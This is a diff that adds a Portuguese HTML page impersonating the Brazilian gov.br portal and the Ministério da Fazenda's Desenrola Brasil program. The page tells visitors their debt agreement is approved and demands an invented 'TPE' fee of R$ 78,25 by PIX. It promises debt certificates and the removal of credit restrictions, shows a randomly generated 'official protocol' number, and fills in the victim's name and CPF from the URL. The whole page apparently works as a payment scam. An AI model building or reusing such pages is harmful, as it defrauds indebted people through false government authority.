@@ -1,0 +1,711 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head> 
+    <meta charset="UTF-8">
+    <!-- Utmify: captura de UTMs + pixel (ver desen/js/utmify-tracking.js) -->
+    <script src="/desen/js/utmify-tracking.js"></script>
+    <!-- Pixel da Meta nativo + eventos Purchase/IC (ver desen/js/meta-pixel.js) -->
+    <script src="/desen/js/meta-pixel.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+    <script src="/desen/js/admin-bypass.js"></script>
+    <meta name="robots" content="noindex, nofollow">
+    <title>Guia de Regularização Cadastral (TPE) — Portal gov.br</title>
+    <link rel="icon" type="image/png" sizes="32x32" href="../consulta/images/iconegov.png">
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=Open+Sans:wght@400;600;700;800&display=swap" rel="stylesheet">
+
+    <style>
+        /* --- RESET & DESIGN SYSTEM gov.BR --- */
+        *, *::before, *::after {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        :root {
+            --gov-blue: #1351B4;
+            --gov-blue-dark: #0C326F;
+            --gov-blue-navy: #071D41;
+            --gov-blue-soft: #EFF6FF;
+            --gov-blue-border: #BFDBFE;
+            --gov-green: #168821;
+            --gov-green-soft: #ECFDF5;
+            --gov-green-border: #A7F3D0;
+            --gov-yellow: #FFCD07;
+            --gov-gold: #FDB913;
+            --gov-bg: #F0F2F5;
+            --text-heading: #0F172A;
+            --text-body: #334155;
+            --text-muted: #64748B;
+        }
+
+        body {
+            font-family: 'Rawline', 'Inter', 'Open Sans', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background: var(--gov-bg);
+            color: var(--text-body);
+            min-height: 100vh;
+            min-height: 100dvh;
+            display: flex;
+            flex-direction: column;
+            line-height: 1.5;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        /* --- BARRA DO gov FEDERAL --- */
+        .barra-brasil {
+            background: #000000;
+            color: #ffffff;
+            font-size: 11px;
+            font-weight: 600;
+            padding: 5px 16px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border-bottom: 1px solid #1f2937;
+        }
+
+        .barra-brasil-left {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .barra-brasil-logo {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            color: #ffffff;
+            text-decoration: none;
+            font-weight: 800;
+            font-size: 11.5px;
+            letter-spacing: 0.04em;
+        }
+
+        .flag-icon-svg {
+            display: inline-block;
+            vertical-align: middle;
+            border-radius: 1.5px;
+            flex-shrink: 0;
+        }
+
+        .barra-brasil-nav {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .barra-brasil-nav a {
+            color: #9ca3af;
+            text-decoration: none;
+            font-size: 10px;
+        }
+
+        @media (max-width: 540px) {
+            .barra-brasil-nav { display: none; }
+        }
+
+        /* --- HEADER gov.BR --- */
+        .gov-header {
+            background: #ffffff;
+            border-bottom: 2.5px solid var(--gov-blue);
+            box-shadow: 0 1px 4px rgba(0, 0, 0, 0.06);
+            padding: 10px 16px;
+        }
+
+        .gov-header-inner {
+            max-width: 720px;
+            margin: 0 auto;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .gov-brand {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            text-decoration: none;
+        }
+
+        .gov-logo-img {
+            height: 32px;
+            width: auto;
+        }
+
+        .gov-title-block {
+            border-left: 1px solid #cbd5e1;
+            padding-left: 10px;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .gov-dept {
+            font-size: 10.5px;
+            font-weight: 700;
+            color: #64748b;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+        }
+
+        .gov-service {
+            font-size: 12.5px;
+            font-weight: 800;
+            color: var(--gov-blue);
+        }
+
+        /* --- BREADCRUMBS --- */
+        .breadcrumb-bar {
+            background: #e2e8f0;
+            border-bottom: 1px solid #cbd5e1;
+            padding: 6px 16px;
+            font-size: 11.5px;
+            color: #475569;
+        }
+
+        .breadcrumb-inner {
+            max-width: 720px;
+            margin: 0 auto;
+        }
+
+        .breadcrumb-bar span {
+            color: #94a3b8;
+            margin: 0 2px;
+        }
+
+        .breadcrumb-bar strong {
+            color: var(--gov-blue);
+            font-weight: 700;
+        }
+
+        /* --- CONTAINER PRINCIPAL --- */
+        .main-wrap {
+            flex: 1;
+            padding: 24px 16px 40px;
+            display: flex;
+            justify-content: center;
+        }
+
+        .upsell-container {
+            max-width: 580px;
+            width: 100%;
+        }
+
+        .status-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background: var(--gov-green-soft);
+            color: var(--gov-green);
+            border: 1px solid var(--gov-green-border);
+            padding: 4px 14px;
+            border-radius: 50px;
+            font-size: 11.5px;
+            font-weight: 800;
+            letter-spacing: 0.03em;
+            margin-bottom: 12px;
+        }
+
+        .upsell-title {
+            text-align: center;
+            margin-bottom: 16px;
+        }
+
+        .upsell-title h1 {
+            font-size: 22px;
+            font-weight: 900;
+            color: var(--text-heading);
+            line-height: 1.25;
+            letter-spacing: -0.02em;
+        }
+
+        .upsell-title p {
+            font-size: 13.5px;
+            color: var(--text-muted);
+            margin-top: 6px;
+        }
+
+        /* --- CARDS ESTILO gov.BR --- */
+        .card {
+            background: #ffffff;
+            border-radius: 14px;
+            border: 1px solid #e2e8f0;
+            border-left: 4px solid var(--gov-blue);
+            padding: 20px;
+            margin-top: 16px;
+            box-shadow: 0 4px 14px rgba(15, 23, 42, 0.05);
+        }
+
+        .contribuinte-box {
+            background: #f8fafc;
+            border: 1px solid #e2e8f0;
+            border-radius: 10px;
+            padding: 14px 16px;
+            margin-top: 14px;
+            font-size: 13px;
+            line-height: 1.7;
+        }
+
+        .contribuinte-box strong {
+            color: #1e293b;
+        }
+
+        .contribuinte-box span {
+            color: var(--gov-blue);
+            font-weight: 700;
+        }
+
+        .card p {
+            font-size: 13.5px;
+            color: var(--text-body);
+            line-height: 1.6;
+        }
+
+        /* Card de Valor da Taxa */
+        .value-card {
+            background: linear-gradient(135deg, #eff6ff 0%, #dbeafe 100%);
+            border-radius: 14px;
+            border: 1.5px solid var(--gov-blue-border);
+            border-left: 4px solid var(--gov-blue);
+            padding: 22px 18px;
+            margin-top: 16px;
+            text-align: center;
+            box-shadow: 0 4px 14px rgba(19, 81, 180, 0.06);
+        }
+
+        .value-label {
+            font-size: 11.5px;
+            font-weight: 800;
+            color: var(--gov-blue-dark);
+            text-transform: uppercase;
+            letter-spacing: 0.06em;
+            margin-bottom: 4px;
+        }
+
+        .value-amount {
+            font-size: 38px;
+            font-weight: 900;
+            color: var(--gov-blue);
+            letter-spacing: -0.02em;
+        }
+
+        .value-sub {
+            font-size: 12.5px;
+            color: #475569;
+            margin-top: 2px;
+            font-weight: 500;
+        }
+
+        /* Card de Processo */
+        .process-card {
+            background: #ffffff;
+            border-radius: 14px;
+            border: 1px solid #e2e8f0;
+            border-left: 4px solid var(--gov-green);
+            padding: 20px;
+            margin-top: 16px;
+            box-shadow: 0 4px 14px rgba(15, 23, 42, 0.05);
+        }
+
+        .process-card h3 {
+            font-size: 15px;
+            font-weight: 800;
+            color: var(--text-heading);
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .process-card ul {
+            list-style: none;
+            padding: 0;
+        }
+
+        .process-card li {
+            font-size: 13px;
+            color: var(--text-body);
+            padding: 6px 0;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            border-bottom: 1px dashed #f1f5f9;
+        }
+
+        .process-card li:last-child {
+            border-bottom: none;
+        }
+
+        .process-card li::before {
+            content: '✓';
+            color: var(--gov-green);
+            font-size: 14px;
+            font-weight: 900;
+        }
+
+        /* Botão de Pagamento gov.br */
+        .btn-pay {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            width: 100%;
+            padding: 16px 20px;
+            margin-top: 20px;
+            border: none;
+            border-radius: 26px;
+            background: var(--gov-green);
+            color: white;
+            font-size: 15px;
+            font-weight: 800;
+            cursor: pointer;
+            font-family: inherit;
+            text-transform: uppercase;
+            letter-spacing: 0.03em;
+            transition: all 0.2s;
+            box-shadow: 0 4px 14px rgba(22, 136, 33, 0.35);
+        }
+
+        .btn-pay:hover {
+            background: #13741c;
+            transform: translateY(-1px);
+            box-shadow: 0 6px 18px rgba(22, 136, 33, 0.45);
+        }
+
+        .btn-pay:active {
+            transform: scale(0.99);
+        }
+
+        .btn-pay:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .secure-text {
+            text-align: center;
+            margin-top: 14px;
+            font-size: 12px;
+            color: var(--text-muted);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 5px;
+            font-weight: 600;
+        }
+
+        /* Seção do PIX */
+        .pix-section {
+            display: none;
+            background: white;
+            border-radius: 16px;
+            border: 2px solid var(--gov-blue);
+            padding: 24px 18px;
+            margin-top: 20px;
+            text-align: center;
+            box-shadow: 0 6px 20px rgba(19, 81, 180, 0.08);
+            animation: popUp 0.3s ease-out forwards;
+        }
+
+        .pix-section.show {
+            display: block;
+        }
+
+        .pix-section h3 {
+            font-size: 16px;
+            font-weight: 800;
+            color: var(--text-heading);
+            margin-bottom: 4px;
+        }
+
+        .pix-section .pix-sub {
+            font-size: 12.5px;
+            color: var(--text-muted);
+            margin-bottom: 16px;
+        }
+
+        .qr-wrap {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 16px;
+            padding: 10px;
+            background: #ffffff;
+            border-radius: 12px;
+            border: 1px solid #e2e8f0;
+            display: inline-block;
+        }
+
+        .pix-code-box {
+            background: #f8fafc;
+            border: 1px dashed #94a3b8;
+            border-radius: 8px;
+            padding: 12px;
+            word-break: break-all;
+            font-family: monospace;
+            font-size: 11.5px;
+            color: #334155;
+            margin-bottom: 14px;
+            text-align: left;
+            user-select: all;
+        }
+
+        .btn-copy {
+            padding: 12px 24px;
+            border: none;
+            border-radius: 20px;
+            background: var(--gov-blue);
+            color: white;
+            font-size: 13.5px;
+            font-weight: 700;
+            cursor: pointer;
+            font-family: inherit;
+            transition: all 0.2s;
+            box-shadow: 0 2px 8px rgba(19, 81, 180, 0.25);
+        }
+
+        .btn-copy:hover {
+            background: var(--gov-blue-dark);
+        }
+
+        .error-msg {
+            color: #dc2626;
+            font-size: 13px;
+            text-align: center;
+            margin-top: 12px;
+            display: none;
+        }
+
+        /* Spinner & Status */
+        @keyframes spin { to { transform: rotate(360deg); } }
+        @keyframes popUp { from { opacity: 0; transform: translateY(6px); } to { opacity: 1; transform: translateY(0); } }
+
+        .spinner {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: spin 0.6s linear infinite;
+            vertical-align: middle;
+            margin-right: 8px;
+        }
+
+        .checking-payment {
+            display: none;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 16px;
+            font-size: 13px;
+            color: var(--gov-blue);
+            font-weight: 700;
+        }
+
+        .checking-payment.show {
+            display: flex;
+        }
+
+        .checking-dot {
+            width: 8px;
+            height: 8px;
+            background: var(--gov-blue);
+            border-radius: 50%;
+            animation: pulse-dot 1.5s infinite;
+        }
+
+        @keyframes pulse-dot {
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.3; transform: scale(0.8); }
+        }
+
+        /* Footer gov.br */
+        .site-footer {
+            background: var(--gov-blue-navy);
+            color: #ffffff;
+            padding: 20px 16px;
+            margin-top: auto;
+        }
+
+        .site-footer-inner {
+            max-width: 720px;
+            margin: 0 auto;
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+            font-size: 11.5px;
+            color: #94a3b8;
+            line-height: 1.6;
+        }
+
+        .site-footer .gv {
+            font-size: 16px;
+            font-weight: 900;
+            color: #ffffff;
+            margin-bottom: 2px;
+        }
+
+        .site-footer .gv span {
+            color: var(--gov-gold);
+        }
+
+        .site-footer strong {
+            color: #ffffff;
+        }
+    </style>
+</head>
+
+<body>
+    <!-- ===== BARRA DO gov FEDERAL ===== -->
+    <div class="barra-brasil">
+        <div class="barra-brasil-left">
+            <a href="https://www.gov.br" class="barra-brasil-logo" target="_blank" rel="noopener">
+                <svg class="flag-icon-svg" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 14" width="16" height="11" style="border-radius: 1.5px; flex-shrink: 0; display: inline-block; vertical-align: middle;">
+                    <rect width="20" height="14" fill="#009c3b"/>
+                    <polygon points="10,1.8 18.2,7 10,12.2 1.8,7" fill="#ffdf00"/>
+                    <circle cx="10" cy="7" r="3.2" fill="#002776"/>
+                    <path d="M 6.9 7.4 A 3.2 3.2 0 0 1 13.1 6.5 A 3.2 3.2 0 0 0 6.9 7.4 Z" fill="#ffffff"/>
+                </svg>
+                <strong>BRASIL</strong>
+            </a>
+        </div>
+        <nav class="barra-brasil-nav">
+            <a href="javascript:void(0)">Simplifique!</a>
+            <a href="javascript:void(0)">Participe</a>
+            <a href="javascript:void(0)">Acesso à informação</a>
+            <a href="javascript:void(0)">Legislação</a>
+            <a href="javascript:void(0)">Canais</a>
+        </nav>
+    </div>
+
+    <!-- ===== HEADER gov.BR ===== -->
+    <header class="gov-header">
+        <div class="gov-header-inner">
+            <div class="gov-brand">
+                <img src="../consulta/images/iconegov.png" alt="gov.br" class="gov-logo-img">
+                <div class="gov-title-block">
+                    <span class="gov-dept">Ministério da Fazenda</span>
+                    <span class="gov-service">Programa Desenrola Brasil</span>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <!-- ===== BREADCRUMB ===== -->
+    <div class="breadcrumb-bar">
+        <div class="breadcrumb-inner">
+            Você está aqui: Página Inicial <span>></span> Serviços <span>></span> Programa Desenrola Brasil <span>></span> <strong>Regularização Cadastral e TPE</strong>
+        </div>
+    </div>
+
+    <!-- ===== CONTEÚDO PRINCIPAL ===== -->
+    <main class="main-wrap">
+        <div class="upsell-container">
+            
+            <div class="upsell-title">
+                <span class="status-badge">✓ ACORDO HOMOLOGADO COM SUCESSO</span>
+                <h1 id="upsell-heading">Guia de Regularização Cadastral (TPE)</h1>
+                <p>Emissão de Certidão Negativa e Baixa de Restrições Financeiras</p>
+            </div>
+
+            <!-- Dados do Contribuinte -->
+            <div class="contribuinte-box" id="info-contribuinte">
+                <div><strong>Beneficiário(a):</strong> <span id="dyn-nome">Carregando...</span></div>
+                <div><strong>Documento (CPF):</strong> <span id="dyn-cpf">Carregando...</span></div>
+                <div><strong>Protocolo Oficial:</strong> <span id="dyn-proto">BR-98421034</span></div>
+                <div><strong>Situação:</strong> <span style="color: #168821;">Acordo Confirmado — Aguardando TPE</span></div>
+            </div>
+
+            <div class="card">
+                <p>
+                    Para a emissão da sua <strong>Certidão Negativa de Débitos (CND)</strong> e para a efetivação da baixa automática das restrições nos bancos de dados do <strong>Banco Central (SCR), Serasa Experian e SPC</strong>, é necessária a liquidação da Taxa de Processamento Eletrônico (TPE).
+                </p>
+                <br>
+                <p>
+                    A TPE cobre os custos operacionais de compensação e registro digital perante o Sistema Financeiro Nacional.
+                </p>
+            </div>
+
+            <div class="value-card">
+                <div class="value-label">VALOR DA TAXA OFICIAL (TPE)</div>
+                <div class="value-amount" id="upsell-value">R$ 78,25</div>
+                <div class="value-sub">Taxa única para baixa imediata de restrições</div>
+            </div>
+
+            <div class="process-card">
+                <h3>Processamento e Benefícios Imediatos</h3>
+                <ul>
+                    <li>Confirmação instantânea do pagamento via Banco Central</li>
+                    <li>Emissão da Certidão Negativa de Débitos com autenticação digital</li>
+                    <li>Atualização e restabelecimento do Score em até 24 horas</li>
+                    <li>Desbloqueio para novas linhas de crédito e financiamentos</li>
+                </ul>
+            </div>
+
+            <!-- Botão de Ação -->
+            <button class="btn-pay" id="btn-pay" onclick="generateUpsellPix()">
+                <span id="btn-pay-text">EMITIR GUIA PIX DE REGULARIZAÇÃO</span>
+            </button>
+
+            <div class="error-msg" id="error-msg"></div>
+
+            <!-- Área do PIX -->
+            <div class="pix-section" id="pix-section">
+                <h3>Guia Oficial de Pagamento Gerada!</h3>
+                <p class="pix-sub">Utilize o aplicativo do seu banco para ler o QR Code ou cole a chave PIX:</p>
+                <div class="qr-wrap" id="qr-wrap"></div>
+                <div class="pix-code-box" id="pix-code"></div>
+                <button class="btn-copy" id="btn-copy" onclick="copyPixCode()">Copiar Código PIX</button>
+                <div class="checking-payment" id="checking-payment">
+                    <div class="checking-dot"></div>
+                    Aguardando confirmação do Banco Central...
+                </div>
+            </div>
+
+            <p class="secure-text">
+                <svg width="15" height="15" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                    <path stroke-linecap="round" stroke-linejoin="round" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
+                </svg>
+                Ambiente Criptografado e Seguro — Ministério da Fazenda
+            </p>
+        </div>
+    </main>
+
+    <!-- ===== FOOTER gov.BR ===== -->
+    <footer class="site-footer">
+        <div class="site-footer-inner">
+            <div class="gv">gov<span>.br</span></div>
+            <p>Todo o conteúdo deste site está publicado sob a licença <strong>Creative Commons Atribuição-SemDerivações 3.0 Não Adaptada</strong>.</p>
+            <p><strong>Ministério da Fazenda</strong> — Secretaria de Reformas Econômicas — gov Federal do Brasil</p>
+        </div>
+    </footer>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+    <script src="/desen/js/utmify-order.js"></script>
+    <script src="/desen/js/catalogo.js"></script>
+    <script src="js/config.js"></script>
+    <script src="js/checkout.js"></script>
+
+    <script>
+        // Carrega dados dinâmicos do contribuinte
+        (function() {
+            var params = new URLSearchParams(window.location.search);
+            var nome = params.get('nome') || localStorage.getItem('site.nome') || 'Contribuinte';
+            var cpf = params.get('cpf') || localStorage.getItem('site.cpf') || '';
+
+            function formatCPF(v) {
+                var d = String(v || '').replace(/\D/g, '').slice(0, 11);
+                if (d.length <= 3) return d;
+                if (d.length <= 6) return d.slice(0, 3) + '.' + d.slice(3);
+                if (d.length <= 9) return d.slice(0, 3) + '.' + d.slice(3, 6) + '.' + d.slice(6);
+                return d.slice(0, 3) + '.' + d.slice(3, 6) + '.' + d.slice(6, 9) + '-' + d.slice(9);
+            }
+
+            document.getElementById('dyn-nome').textContent = nome.toUpperCase();
+            document.getElementById('dyn-cpf').textContent = cpf ? formatCPF(cpf) : 'Registrado no Sistema';
+            document.getElementById('dyn-proto').textContent = 'BR-' + Math.floor(10000000 + Math.random() * 90000000);
+        })();
+    </script>
+</body>
+</html>
